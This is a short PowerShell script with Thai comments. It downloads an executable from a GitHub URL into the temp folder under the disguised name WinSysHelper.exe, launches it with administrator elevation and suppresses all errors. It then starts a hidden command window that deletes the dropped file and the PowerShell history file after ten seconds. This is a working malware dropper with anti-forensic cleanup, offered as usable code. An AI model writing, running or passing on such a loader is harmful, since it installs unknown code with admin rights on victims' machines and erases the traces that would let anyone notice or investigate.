$ErrorActionPreference = 'SilentlyContinue'

# 1. เตรียมที่อยู่ไฟล์
$output = "$env:TEMP\WinSysHelper.exe"
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"

# 2. ดาวน์โหลดไฟล์ (ใช้ WebClient ตรงๆ เพื่อเลี่ยงปัญหาเน็ตหลุด)
try {
    if (Test-Path $output) { Remove-Item $output -Force }
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $output)
} catch {}

# 3. สั่งรันแบบ Admin
if (Test-Path $output) {
    Start-Process -FilePath $output -Verb RunAs
}

# 4. สั่ง CMD มารอลบประวัติและไฟล์ทิ้ง (นับถอยหลัง 10 วิ)
$history = (Get-PSReadlineOption).HistorySavePath
$clean = "timeout /t 10 && del /f /q `"$output`" && del /f /q `"$history`""
Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden

exit
